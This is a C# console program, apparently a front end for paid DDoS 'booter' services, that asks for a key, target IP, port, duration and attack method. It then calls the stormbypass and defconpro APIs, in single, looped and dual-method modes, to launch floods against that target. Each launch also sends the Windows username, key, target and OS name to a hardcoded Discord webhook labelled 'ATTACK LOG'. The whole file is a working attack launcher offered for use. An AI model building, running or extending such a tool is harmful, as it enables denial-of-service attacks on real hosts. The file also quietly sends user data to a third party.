using System;
using System.Net;
using System.Threading;
using System.Net.Http;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Management;

namespace HardwareSpoofer
{
    internal class Global
    {

        // 

        internal class ConsoleSpinner
        {
            private int _currentAnimationFrame;

            public ConsoleSpinner()
            {
                SpinnerAnimationFrames = new[]
                                         {
                                         '|',
                                         '/',
                                         '-',
                                         '\\'
                                     };
            }

            public char[] SpinnerAnimationFrames { get; set; }

            public void UpdateProgress()
            {
                // Store the current position of the cursor
                var originalX = Console.CursorLeft;
                var originalY = Console.CursorTop;

                // Write the next frame (character) in the spinner animation
                Console.Write(SpinnerAnimationFrames[_currentAnimationFrame]);

                // Keep looping around all the animation frames
                _currentAnimationFrame++;
                if (_currentAnimationFrame == SpinnerAnimationFrames.Length)
                {
                    _currentAnimationFrame = 0;
                }

                // Restore cursor to original position
                Console.SetCursorPosition(originalX, originalY);
            }
        }

        //

        private static async Task Main(string[] Args)
        {
            int Attack = 0;
            Console.CursorVisible = false;
            var originalX = Console.CursorLeft;
            var originalY = Console.CursorTop;
            Console.Title = "YAGO DEVELOPMENT LTD.AŞ";
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("≫ ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[1] STORM");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("≫ ");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("[2] DEFCON");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("≫ ");

            //

            //
            string a = Console.ReadLine();

            if (a == "1")
            {
                Console.Title = "YAGO DEVELOPMENT LTD.AŞ";
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("≫ ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("[1] RUN ONE ATTACK");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("≫ ");
                Console.ForegroundColor = ConsoleColor.Blue;
                Console.WriteLine("[2] RUN TWO ATTACK");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("≫ ");

                string b = Console.ReadLine();

                if (b == "1")
                {
                    Console.Title = "YAGO DEVELOPMENT LTD.AŞ";
                    Console.Clear();
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write("≫ ");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("[1] LOOP");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write("≫ ");
                    Console.ForegroundColor = ConsoleColor.Blue;
                    Console.WriteLine("[2] JUST ONE");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write("≫ ");

                    string l = Console.ReadLine();

                    if (l == "1")
                    {
                        Console.Clear();
                        string key = "";
                        string ip = "";
                        string port = "";
                        string times = "";
                        string method = "";

                        HttpClient client = new HttpClient();

                        Console.Title = "YAGO DEVELOPMENT LTD.AŞ";
                        Console.ForegroundColor = ConsoleColor.Blue;

                        Console.WriteLine("                                             ╔════════════════════════════╗");
                        Console.WriteLine("                                             ║            YAGO            ║");
                        Console.WriteLine("                                             ║     DEVELOPMENT LTD.AŞ     ║");
                        Console.WriteLine("                                             ╚════════════════════════════╝");
                        Console.WriteLine("                                                   " + DateTime.Now + "     ");
                        Console.WriteLine("");
                        Console.WriteLine("Key;");
                        key = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Ip;");
                        ip = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Port;");
                        port = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Time;");
                        times = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Method;");
                        method = Console.ReadLine();

                        using (DcWebHook dcWeb = new DcWebHook())
                        {
                            ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                            foreach (ManagementObject managementObject in mos.Get())
                            {
                                String OSName = managementObject["Caption"].ToString();
                                dcWeb.ProfilePicture = "";
                                dcWeb.UserName = "ATTACK LOG";
                                dcWeb.WebHook = "https://canary.discordapp.com/api/webhooks/702234977311522837/09bfmaXMAIN2YEshUpu0CXEBI_EwnZRFTb9qHvgdL5oYpQhFISFiilQF2xZ_JlkkZjgv";
                                dcWeb.SendMessage("```" + "UserName: " + Environment.UserName + Environment.NewLine + "KEY: " + key + Environment.NewLine + "ATTACK: " + ip + ":" + port + Environment.NewLine + "TIME: " + times + " / Starting Time " + DateTime.Now + Environment.NewLine + "Method: " + method + Environment.NewLine + "OS: " + OSName + "```");
                            }
                        }

                        string version = "has been sent";
                        for (int i = 0; i <= 1000; i = i + 2)
                        {
                            WebClient wb = new WebClient();
                            string HWIDLIST = wb.DownloadString("https://api.stormbypass.xyz/vip-api.php?key=" + key + "&host=" + ip + "&port=" + port + "&time=" + times + "&method=" + method);
                            if (HWIDLIST.Contains(version))
                                {
                                Console.WriteLine("");
                                Console.WriteLine("ATTACK STARTED!");
                                Console.WriteLine("");
                                Console.WriteLine("ATTACK STARTED TIME: " + times + " METHOD: " + method + " SITE: " + ip + ":" + port);
                                Console.Write("ATTACK RUNNING....");
                                Thread.Sleep(300010);
                                Attack = 1;
                                ConsoleColor background = Console.BackgroundColor;
                                ConsoleColor foreground = Console.ForegroundColor;
                                Console.ForegroundColor = ConsoleColor.Black;
                                Console.BackgroundColor = ConsoleColor.White;
                                var s = new ConsoleSpinner();
                                Console.Write("ATTACK RUNNING ");
                                DateTime zaman1 = DateTime.UtcNow;
                                while (Attack == 1)
                                {
                                    DateTime zaman2 = DateTime.UtcNow;

                                    var zaman3 = zaman2.Ticks - zaman1.Ticks;

                                    Thread.Sleep(140);
                                    s.UpdateProgress();

                                    if (Convert.ToDouble(zaman3) > 3000004414)
                                    {
                                        break;
                                    }

                                }
                                Console.BackgroundColor = ConsoleColor.Black;
                                Console.ForegroundColor = ConsoleColor.Blue;
                            }

                            else
                            {

                                Console.WriteLine("There is a problem!");
                                var content = await client.GetStringAsync("https://api.stormbypass.xyz/vip-api.php?key=" + key + "&host=" + ip + "&port=" + port + "&time=" + times + "&method=" + method);
                                Console.WriteLine(content);
                                Console.ReadKey();

                            }
                        }

                    }


                if (l == "2")
                {

                        Console.Clear();
                        string key = "";
                        string ip = "";
                        string port = "";
                        string time = "";
                        string method = "";

                        HttpClient client = new HttpClient();

                        Console.Title = "YAGO DEVELOPMENT LTD.AŞ";
                        Console.ForegroundColor = ConsoleColor.Blue;

                        Console.WriteLine("                                             ╔════════════════════════════╗");
                        Console.WriteLine("                                             ║            YAGO            ║");
                        Console.WriteLine("                                             ║     DEVELOPMENT LTD.AŞ     ║");
                        Console.WriteLine("                                             ╚════════════════════════════╝");
                        Console.WriteLine("                                                   " + DateTime.Now + "     ");
                        Console.WriteLine("");
                        Console.WriteLine("Key;");
                        key = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Ip;");
                        ip = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Port;");
                        port = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Time;");
                        time = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Method;");
                        method = Console.ReadLine();

                        using (DcWebHook dcWeb = new DcWebHook())
                        {
                            ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                            foreach (ManagementObject managementObject in mos.Get())
                            {
                                String OSName = managementObject["Caption"].ToString();
                                dcWeb.ProfilePicture = "";
                                dcWeb.UserName = "ATTACK LOG";
                                dcWeb.WebHook = "https://canary.discordapp.com/api/webhooks/702234977311522837/09bfmaXMAIN2YEshUpu0CXEBI_EwnZRFTb9qHvgdL5oYpQhFISFiilQF2xZ_JlkkZjgv";
                                dcWeb.SendMessage("```" + "UserName: " + Environment.UserName + Environment.NewLine + "KEY: " + key + Environment.NewLine + "ATTACK: " + ip + ":" + port + Environment.NewLine + "TIME: " + time + " / Starting Time " + DateTime.Now + Environment.NewLine + "Method: " + method + Environment.NewLine + "OS: " + OSName + "```");
                            }
                        }

                        string version = "has been sent";

                        WebClient wb = new WebClient();
                        string HWIDLIST = wb.DownloadString("https://api.stormbypass.xyz/vip-api.php?key=" + key + "&host=" + ip + "&port=" + port + "&time=" + time + "&method=" + method);
                        if (HWIDLIST.Contains(version))
                        {
                            Console.WriteLine("");
                            Console.WriteLine("ATTACK STARTED!");
                            Console.WriteLine("");
                            Console.WriteLine("ATTACK STARTED TIME: " + time + " METHOD: " + method + " SITE: " + ip + ":" + port);
                            Console.ReadKey();
                        }
                        Attack = 1;
                        ConsoleColor background = Console.BackgroundColor;
                        ConsoleColor foreground = Console.ForegroundColor;
                        Console.ForegroundColor = ConsoleColor.Black;
                        Console.BackgroundColor = ConsoleColor.White;
                        var s = new ConsoleSpinner();
                        Console.Write("ATTACK RUNNING ");
                        DateTime zaman1 = DateTime.UtcNow;
                        while (Attack == 1)
                        {
                            DateTime zaman2 = DateTime.UtcNow;

                            var zaman3 = zaman2.Ticks - zaman1.Ticks;

                            Thread.Sleep(140);
                            s.UpdateProgress();

                            if (Convert.ToDouble(zaman3) > 3000004414)
                            {
                                break;
                            }

                        }
                        Console.BackgroundColor = ConsoleColor.Black;
                        Console.ForegroundColor = ConsoleColor.Blue;
                    }
                    else   
                        {
                        Console.WriteLine("There is a problem!");
                        //var content = await client.GetStringAsync("https://api.stormbypass.xyz/vip-api.php?key=" + key + "&host=" + ip + "&port=" + port + "&time=" + time + "&method=" + method);
                        //Console.WriteLine(content);
                        Console.ReadKey();

                        }
                    }
                

                // 2 li saldırı

                if (b == "2")
                {
                    Console.Title = "YAGO DEVELOPMENT LTD.AŞ";
                    Console.Clear();
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write("≫ ");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("[1] LOOP");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write("≫ ");
                    Console.ForegroundColor = ConsoleColor.Blue;
                    Console.WriteLine("[2] JUST ONE");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write("≫ ");

                    string n = Console.ReadLine();

                    // Loop Veya Sadece 1 kere

                    if (n == "1")
                    {
                        Console.Clear();
                        string key = "";
                        string ip = "";
                        string port = "";
                        string time = "";
                        string method = "";
                        string method2 = "";

                        HttpClient client = new HttpClient();

                        Console.Title = "YAGO DEVELOPMENT LTD.AŞ";
                        Console.ForegroundColor = ConsoleColor.Blue;

                        Console.WriteLine("                                             ╔════════════════════════════╗");
                        Console.WriteLine("                                             ║            YAGO            ║");
                        Console.WriteLine("                                             ║     DEVELOPMENT LTD.AŞ     ║");
                        Console.WriteLine("                                             ╚════════════════════════════╝");
                        Console.WriteLine("                                                   " + DateTime.Now + "     ");
                        Console.WriteLine("");
                        Console.WriteLine("Key; ");
                        key = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Ip; ");
                        ip = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Port; ");
                        port = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Time; ");
                        time = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Method; ");
                        method = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Method2; ");
                        method2 = Console.ReadLine();

                        using (DcWebHook dcWeb = new DcWebHook())
                        {
                            ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                            foreach (ManagementObject managementObject in mos.Get())
                            {
                                String OSName = managementObject["Caption"].ToString();
                                dcWeb.ProfilePicture = "";
                                dcWeb.UserName = "ATTACK LOG";
                                dcWeb.WebHook = "https://canary.discordapp.com/api/webhooks/702234977311522837/09bfmaXMAIN2YEshUpu0CXEBI_EwnZRFTb9qHvgdL5oYpQhFISFiilQF2xZ_JlkkZjgv";
                                dcWeb.SendMessage("```" + "UserName: " + Environment.UserName + Environment.NewLine + "KEY: " + key + Environment.NewLine + "ATTACK: " + ip +":"+ port+ Environment.NewLine + "TIME: " + time + " / Starting Time  " + DateTime.Now + Environment.NewLine + "Method: " + method + Environment.NewLine + "OS: " + OSName + "```");
                            }
                        }

                        string version = "has been sent";
                        for (int i = 0; i <= 1000; i = i + 2)
                        {
                            WebClient wb = new WebClient();
                            string HWIDLIST = wb.DownloadString("https://api.stormbypass.xyz/vip-api.php?key=" + key + "&host=" + ip + "&port=" + port + "&time=" + time + "&method=" + method);
                            if (HWIDLIST.Contains(version))
                            {
                                Console.WriteLine("");
                                Console.WriteLine("ATTACK STARTED TIME: " + time + " METHOD: " + method + " SITE: " + ip + ":" + port);
                                string versions = "has been sent";
                                for (int u = 0; u <= 1000; u = u + 200000000)
                                {
                                    WebClient wba = new WebClient();
                                    string HWIDLISTS = wba.DownloadString("https://api.stormbypass.xyz/vip-api.php?key=" + key + "&host=" + ip + "&port=" + port + "&time=" + time + "&method=" + method2);
                                    if (HWIDLISTS.Contains(versions))
                                    {
                                        Console.WriteLine("ATTACK STARTED TIME: " + time + " METHOD: " + method2 + " SITE: " + ip + ":" + port);
                                    }
                                }
                                Attack = 1;
                                ConsoleColor background = Console.BackgroundColor;
                                ConsoleColor foreground = Console.ForegroundColor;
                                Console.ForegroundColor = ConsoleColor.Black;
                                Console.BackgroundColor = ConsoleColor.White;
                                var s = new ConsoleSpinner();
                                Console.Write("ATTACK RUNNING ");
                                DateTime zaman1 = DateTime.UtcNow;
                                while (Attack == 1)
                                {
                                    DateTime zaman2 = DateTime.UtcNow;

                                    var zaman3 = zaman2.Ticks - zaman1.Ticks;

                                    Thread.Sleep(140);
                                    s.UpdateProgress();

                                    if (Convert.ToDouble(zaman3) > 3000004414)
                                    {
                                        break;
                                    }

                                }
                                Console.BackgroundColor = ConsoleColor.Black;
                                Console.ForegroundColor = ConsoleColor.Blue;
                            }
                            else
                            {

                                Console.WriteLine("There is a problem!");
                                var content = await client.GetStringAsync("https://api.stormbypass.xyz/vip-api.php?key=" + key + "&host=" + ip + "&port=" + port + "&time=" + time + "&method=" + method);
                                Console.WriteLine(content);
                                Console.ReadKey();

                            }
                        }
                    }

                    if (n == "2")
                    {
                        Console.Clear();
                        string key = "";
                        string ip = "";
                        string port = "";
                        string time = "";
                        string method = "";

                        HttpClient client = new HttpClient();

                        Console.Title = "YAGO DEVELOPMENT LTD.AŞ";
                        Console.ForegroundColor = ConsoleColor.Blue;

                        Console.WriteLine("                                             ╔════════════════════════════╗");
                        Console.WriteLine("                                             ║            YAGO            ║");
                        Console.WriteLine("                                             ║     DEVELOPMENT LTD.AŞ     ║");
                        Console.WriteLine("                                             ╚════════════════════════════╝");
                        Console.WriteLine("");
                        Console.WriteLine("Key;");
                        key = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Ip;");
                        ip = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Port;");
                        port = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Time;");
                        time = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Method;");
                        method = Console.ReadLine();


                        using (DcWebHook dcWeb = new DcWebHook())
                        {
                            ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                            foreach (ManagementObject managementObject in mos.Get())
                            {
                                String OSName = managementObject["Caption"].ToString();
                                dcWeb.ProfilePicture = "";
                                dcWeb.UserName = "ATTACK LOG";
                                dcWeb.WebHook = "https://canary.discordapp.com/api/webhooks/702234977311522837/09bfmaXMAIN2YEshUpu0CXEBI_EwnZRFTb9qHvgdL5oYpQhFISFiilQF2xZ_JlkkZjgv";
                                dcWeb.SendMessage("```" + "UserName: " + Environment.UserName + Environment.NewLine + "KEY: " + key + Environment.NewLine + "ATTACK: " + ip + ":" + port + Environment.NewLine + "TIME: " + time + " / Starting Time " + DateTime.Now + Environment.NewLine + "Method: " + method + Environment.NewLine + "OS: " + OSName + "```");
                            }
                        }

                        string version = "has been sent";
                        for (int i = 0; i <= 1000; i = i + 2)
                        {
                            WebClient wb = new WebClient();
                            string HWIDLIST = wb.DownloadString("https://api.stormbypass.xyz/vip-api.php?key=" + key + "&host=" + ip + "&port=" + port + "&time=" + time + "&method=" + method);
                            if (HWIDLIST.Contains(version))
                            {
                                Console.WriteLine("");
                                Console.WriteLine("ATTACK STARTED!");
                                Console.WriteLine("");
                                Console.WriteLine("ATTACK STARTED TIME: " + time + " METHOD: " + method + " SITE: " + ip + ":" + port);
                                string versions = "has been sent";
                                for (int u = 0; u <= 1000; u = u + 20000000)
                                {
                                    WebClient wba = new WebClient();
                                    string HWIDLISTS = wba.DownloadString("https://api.stormbypass.xyz/vip-api.php?key=" + key + "&host=" + ip + "&port=" + port + "&time=" + time + "&method=" + method);
                                    if (HWIDLISTS.Contains(versions))
                                    {
                                        Console.WriteLine("ATTACK STARTED TIME: " + time + " METHOD: " + method + " SITE: " + ip + ":" + port);
                                    }
                                }
                                Attack = 1;
                                ConsoleColor background = Console.BackgroundColor;
                                ConsoleColor foreground = Console.ForegroundColor;
                                Console.ForegroundColor = ConsoleColor.Black;
                                Console.BackgroundColor = ConsoleColor.White;
                                var s = new ConsoleSpinner();
                                Console.Write("ATTACK RUNNING ");
                                DateTime zaman1 = DateTime.UtcNow;
                                while (Attack == 1)
                                {
                                    DateTime zaman2 = DateTime.UtcNow;

                                    var zaman3 = zaman2.Ticks - zaman1.Ticks;

                                    Thread.Sleep(140);
                                    s.UpdateProgress();

                                    if (Convert.ToDouble(zaman3) > 3000004414)
                                    {
                                        break;
                                    }

                                }
                                Console.BackgroundColor = ConsoleColor.Black;
                                Console.ForegroundColor = ConsoleColor.Blue;
                            }
                            else
                            {
                                Console.WriteLine("There is a problem!");
                                var content = await client.GetStringAsync("https://api.stormbypass.xyz/vip-api.php?key=" + key + "&host=" + ip + "&port=" + port + "&time=" + time + "&method=" + method);
                                Console.WriteLine(content);

                            }
                        }
                    }
                }
            }

            // Defcon

        if (a == "2")
        {
            Console.Clear();
            string key = "";
            string ip = "";
            string port = "";
            string time = "";
            string method = "";
            string method2 = "";

            HttpClient client = new HttpClient();

            Console.Title = "YAGO DEVELOPMENT LTD.AŞ";
            Console.ForegroundColor = ConsoleColor.Blue;

            Console.WriteLine("                                             ╔════════════════════════════╗");
            Console.WriteLine("                                             ║            YAGO            ║");
            Console.WriteLine("                                             ║     DEVELOPMENT LTD.AŞ     ║");
            Console.WriteLine("                                             ╚════════════════════════════╝");
            Console.WriteLine("                                                   " + DateTime.Now + "     ");
            Console.WriteLine("");
            Console.WriteLine("Key;");
            key = Console.ReadLine();
            Console.WriteLine("");
            Console.WriteLine("Ip;");
            ip = Console.ReadLine();
            Console.WriteLine("");
            Console.WriteLine("Port;");
            port = Console.ReadLine();
            Console.WriteLine("");
            Console.WriteLine("Time;");
            time = Console.ReadLine();
            Console.WriteLine("");
            Console.WriteLine("Method;");
            method = Console.ReadLine();
            Console.WriteLine("");
            Console.WriteLine("Method2;");
            method2 = Console.ReadLine();

            using (DcWebHook dcWeb = new DcWebHook())
            {
                ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                foreach (ManagementObject managementObject in mos.Get())
                {
                    String OSName = managementObject["Caption"].ToString();
                    dcWeb.ProfilePicture = "";
                    dcWeb.UserName = "ATTACK LOG";
                    dcWeb.WebHook = "https://canary.discordapp.com/api/webhooks/702234977311522837/09bfmaXMAIN2YEshUpu0CXEBI_EwnZRFTb9qHvgdL5oYpQhFISFiilQF2xZ_JlkkZjgv";
                    dcWeb.SendMessage("```" + "UserName: " + Environment.UserName + Environment.NewLine + "KEY: " + key + Environment.NewLine + "ATTACK: " + ip + ":" + port + Environment.NewLine + "TIME: " + time + " / Starting Time " + DateTime.Now + Environment.NewLine + "Method: " + method + Environment.NewLine + "OS: " + OSName + "```");
                }
            }

                string version = "LOGIN OK";

                for (int i = 0; i <= 1000; i = i + 2)
                {
                    WebClient wb = new WebClient();
                    string HWIDLIST = wb.DownloadString("https://defconpro.io/api.php?ip=" + ip + "&port=" + port + "&time=" + time + "&method=" + method + "&key=" + key);
                    if (HWIDLIST.Contains(version))
                    {
                        Console.WriteLine("");
                        Console.WriteLine("ATTACK STARTED!");
                        Console.WriteLine("");
                        Console.WriteLine("ATTACK STARTED TIME: " + time + " METHOD: " + method + " SITE: " + ip + ":" + port);
                        string versions = "LOGIN OK";
                        for (int u = 0; u <= 1000; u = u + 20000000)
                        {
                            Thread.Sleep(5000);
                            WebClient wba = new WebClient();
                            string HWIDLISTS = wb.DownloadString("https://defconpro.io/api.php?ip=" + ip + "&port=" + port + "&time=" + time + "&method=" + method2 + "&key=" + key);
                            if (HWIDLISTS.Contains(versions))
                            {
                                Console.WriteLine("ATTACK STARTED TIME: " + time + " METHOD: " + method2 + " SITE: " + ip + ":" + port);
                            }
                            Thread.Sleep(800010);
                        }
                    }
                    else
                    {
                        Console.WriteLine("There is a problem!");
                        var content = await client.GetStringAsync("https://defconpro.io/api.php?ip=" + ip + "&port=" + port + "&time=" + time + "&method=" + method + "&key=" + key);
                        Console.WriteLine(content);
                        Console.ReadKey();
                    }
                }
            }
        }
    }
}